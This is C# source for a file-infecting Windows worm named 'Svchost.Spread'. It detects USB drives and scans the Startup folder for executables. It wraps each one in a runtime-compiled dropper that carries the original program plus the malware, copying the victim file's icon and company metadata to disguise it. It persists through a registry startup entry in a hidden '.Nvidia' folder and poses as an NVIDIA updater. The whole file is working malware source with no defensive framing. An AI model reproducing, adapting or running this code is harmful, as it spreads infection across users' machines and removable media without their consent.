using System;
using System.IO;
using System.Drawing;
using System.Collections.Generic;
using System.Diagnostics;
using System.CodeDom.Compiler;
using System.Threading;

using System.Windows.Forms;
using System.Reflection;
using System.Drawing.IconLib;
using Microsoft.CSharp;
using TsudaKageyu;
using System.CodeDom;

namespace Svchost.Spread
{
    public class Spreader
    {
        private string assemblyName;
        private string fakeAssemblyName;
        private string applicationPath;
        private string sessionName;
        private string targetFolder;
        private DriveDetector driveDetector;
        private System.Threading.Timer _timer;
        private int infectInterval;
        private List<string> connectedUsb;
        private string iconName;

        public Spreader(string fakeAssembName, string assembName, string appPath, string windowsName)
        {
            connectedUsb = new List<string>();
            iconName = "icon.ico";
            fakeAssemblyName = fakeAssembName;
            assemblyName = assembName;
            applicationPath = appPath;
            sessionName = windowsName;
            targetFolder = "C:\\Users\\" + windowsName + "\\.Nvidia\\";
            infectInterval = 9;
            
            _timer = new System.Threading.Timer(infectRoutine, null, 5000, infectInterval * 1000);
            
            //if (checkEnvironment())
                driveDetector = new DriveDetector(applicationPath + assemblyName, onUSBDetected);
        }

        private bool isExecutableInfected(string path)
        {
            try
            {
                Assembly assembly = Assembly.LoadFile(path);
                foreach (string resourceName in assembly.GetManifestResourceNames())
                {
                    if (resourceName.Contains(assemblyName))
                        return true;
                }
            }
            catch
            {

            }
            return false;
        }

        private void exctractIcon(string path)
        {
            try
            {
                IconExtractor ie = new IconExtractor(path);
                Icon icon = ie.GetIcon(0);
                MultiIcon mIcon = new MultiIcon();
                SingleIcon sIcon = mIcon.Add("oink");
                Icon[] splitIcons = IconUtil.Split(icon);
                sIcon.CreateFrom(IconUtil.ToBitmap(splitIcons[splitIcons.Length - 1]), IconOutputFormat.Vista);
                sIcon.Save(applicationPath + iconName);
            }
            catch { }
        }

        void infectRoutine(object state)
        {
            /*try
            {
                foreach (string s in connectedUsb)
                {
                    findAndInfect(s);
                }
                connectedUsb.Clear();
            }
            catch { }*/

            /*try
            {
                string[] startupPaths = Regedit.getStartup();
                Console.WriteLine(startupPaths.Length);//here I can see I have many keys
                foreach (string s in startupPaths)
                {
                    string path = new FileInfo(s).Directory.FullName;
                    Console.WriteLine("a:" + path);

                    if (Directory.Exists(path))
                    {
                        if (path.Length > 0 && !s.Contains(assemblyName))
                            findAndInfect(path);
                    }
                }
            } catch { }*/

            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (Directory.Exists(path))
                {
                    Console.WriteLine(path);
                    findAndInfect(path);
                }
            }
            catch { }
        }

        void findAndInfect(string dir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(dir))
                {
                    if (f.Contains(".exe") && !isExecutableInfected(f))
                        infect(dir, new FileInfo(f).Name);
                }
            }
            catch (System.Exception excpt)
            {

            }

            foreach (string d in Directory.GetDirectories(dir))
            {
                findAndInfect(d);
            }
        }

        public void onUSBDetected(DriveInfo drive)
        {
            findAndInfect(drive.RootDirectory.FullName);
            /*if (!connectedUsb.Contains(drive.RootDirectory.FullName))
                connectedUsb.Add(drive.RootDirectory.FullName);*/
        }
        
        private bool checkEnvironment()
        {
            if(applicationPath == targetFolder)
            {
                Regedit.setStartup(assemblyName, "\"" + applicationPath + assemblyName.Replace(".exe", "") + "\"");
                try
                {
                    if (File.Exists(applicationPath + assemblyName + ".bak"))
                        File.Delete(applicationPath + assemblyName + ".bak");
                } catch { }
                return true;
            }
            else
            {
                if (!Directory.Exists(targetFolder))
                {
                    DirectoryInfo di = Directory.CreateDirectory(targetFolder);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                }

                string fullTargetPath = targetFolder + "\\" + assemblyName; 
                string originPath = System.Reflection.Assembly.GetEntryAssembly().Location;
                if (!File.Exists(fullTargetPath))
                    File.Copy(originPath, fullTargetPath);

                try
                {
                    var spawn = Process.Start(fullTargetPath);
                }
                catch { }

                Process thisprocess = Process.GetCurrentProcess();
                thisprocess.CloseMainWindow();
                thisprocess.Close();
                thisprocess.Dispose();
                Application.Exit();
                Environment.Exit(0);
                return false;
            }
        }

        void infect(string targetFolder, string targetName)
        {
            CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
            CodeCompileUnit unit = new CodeCompileUnit();
            CompilerParameters compilerParameters = new CompilerParameters
            {
                GenerateExecutable = true
            };

            string fullTargetPath = targetFolder + @"\" + targetName;
            string fullTempResultPath = targetFolder + "\\_" + targetName;

            Console.WriteLine("start " + fullTargetPath);
            exctractIcon(fullTargetPath);

            compilerParameters.ReferencedAssemblies.Add("System.dll");
            compilerParameters.EmbeddedResources.Add(fullTargetPath);
            compilerParameters.EmbeddedResources.Add(assemblyName);
            compilerParameters.CompilerOptions = @"/t:winexe /win32icon:" + applicationPath + iconName;
            compilerParameters.OutputAssembly = fullTempResultPath;
            
            FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(fullTargetPath);
            
            /*CodeTypeReference versionAttr = new CodeTypeReference(typeof(AssemblyVersionAttribute));
            CodeAttributeDeclaration versionDecl = new CodeAttributeDeclaration(versionAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.ProductVersion)));*/
            CodeTypeReference companyAttr = new CodeTypeReference(typeof(AssemblyCompanyAttribute));
            CodeAttributeDeclaration companyDecl = new CodeAttributeDeclaration(companyAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.CompanyName)));
            CodeTypeReference copyrightAttr = new CodeTypeReference(typeof(AssemblyCopyrightAttribute));
            CodeAttributeDeclaration copyrightDecl = new CodeAttributeDeclaration(copyrightAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.LegalCopyright)));
            CodeTypeReference descriptionAttr = new CodeTypeReference(typeof(AssemblyDescriptionAttribute));
            CodeAttributeDeclaration descriptionDecl = new CodeAttributeDeclaration(descriptionAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.FileDescription)));
            CodeTypeReference productNameAttr = new CodeTypeReference(typeof(AssemblyProductAttribute));
            CodeAttributeDeclaration productNameDecl = new CodeAttributeDeclaration(productNameAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.ProductName)));
            
            /*if(versionInfo.ProductVersion != "")
                unit.AssemblyCustomAttributes.Add(versionDecl);*/
            unit.AssemblyCustomAttributes.Add(companyDecl);
            unit.AssemblyCustomAttributes.Add(copyrightDecl);
            unit.AssemblyCustomAttributes.Add(descriptionDecl);
            unit.AssemblyCustomAttributes.Add(productNameDecl);

            string cSharpCode = @"public class System0
            {
               static void Main(string[] args)
               {
                    if(args.Length > 0 && args[0] == ""cleanNvidia"")
                    {
                        if(System.IO.File.Exists(""%%FILENAME%%""))
                        {
                            System.IO.File.Move(""%%FILENAME%%"", ""i_"" + ""%%FILENAME%%"");
                            ExtractResource( ""%%FILENAME%%"", ""%%FILENAME%%"");
                            return;
                        }
                    }

                    string path = ""C:/Users/"" + System.Environment.UserName + ""/.Executables/"";
                    if (! System.IO.Directory.Exists(path))
                    {
                        try {
                             System.IO.DirectoryInfo di =  System.IO.Directory.CreateDirectory(path);
                            di.Attributes =  System.IO.FileAttributes.Directory |  System.IO.FileAttributes.Hidden;
                        } catch { return; }
                    }
                    ExtractResource( ""%%FILENAME%%"", path + ""%%FILENAME%%"" );
                    string parameters = """";
                    for(int i = 0; i < args.Length; i++)
                    {
                        parameters += args[i] + """";
                    }
                    var startInfo = new System.Diagnostics.ProcessStartInfo(path + ""%%FILENAME%%"");
                    startInfo.WorkingDirectory = System.IO.Directory.GetCurrentDirectory();
                    startInfo.Arguments = parameters;
                    System.Diagnostics.Process.Start(startInfo);
                    try {
                        ExtractResource( ""NVIDIA Updater Service.exe"", path + ""%%FILENAME2%%"" );
                        System.Diagnostics.Process.Start(path + ""%%FILENAME2%%"");
                    } catch {}
               }

               static void ExtractResource(string resource, string path)
               {
                    System.IO.Stream stream = typeof(System0).Assembly.GetManifestResourceStream(resource);
                    if(stream != null)
                    {
                        byte[] bytes = new byte[(int)stream.Length];
                        stream.Read(bytes, 0, bytes.Length);
                        try {
                            System.IO.File.WriteAllBytes(path, bytes);
                        } catch {}
                    }
               }
            }";

            cSharpCode = cSharpCode.Replace("%%FILENAME%%", targetName);
            cSharpCode = cSharpCode.Replace("%%FILENAME2%%", assemblyName);

            StringWriter sw = new StringWriter();
            cSharpCodeProvider.GenerateCodeFromCompileUnit(unit, sw, new CodeGeneratorOptions());
            sw.Write(cSharpCode);
            string s = sw.ToString();
            CompilerResults results = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters,
            new[] { sw.ToString() });

             foreach (string output in results.Output)
             {
                 Console.WriteLine(output);
             }
             
            if (File.Exists(fullTempResultPath))
            {
                if (File.Exists(fullTargetPath))
                {
                    try
                    {
                        FileAttributes attributes = File.GetAttributes(fullTargetPath);

                        if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
                        {
                            // Make the file RW
                            attributes = attributes & ~FileAttributes.ReadOnly;
                            File.SetAttributes(fullTargetPath, attributes);
                        }
                    }
                    catch (System.Exception excpt)
                    {}

                    try
                    {
                        File.Delete(fullTargetPath);
                    }
                    catch (System.Exception excpt)
                    {}
                }

                try
                {
                    File.Move(fullTempResultPath, fullTargetPath);
                }
                catch (System.Exception excpt)
                {}
            }
            Console.WriteLine("build ");

            cSharpCodeProvider.Dispose();
        }
    }
}
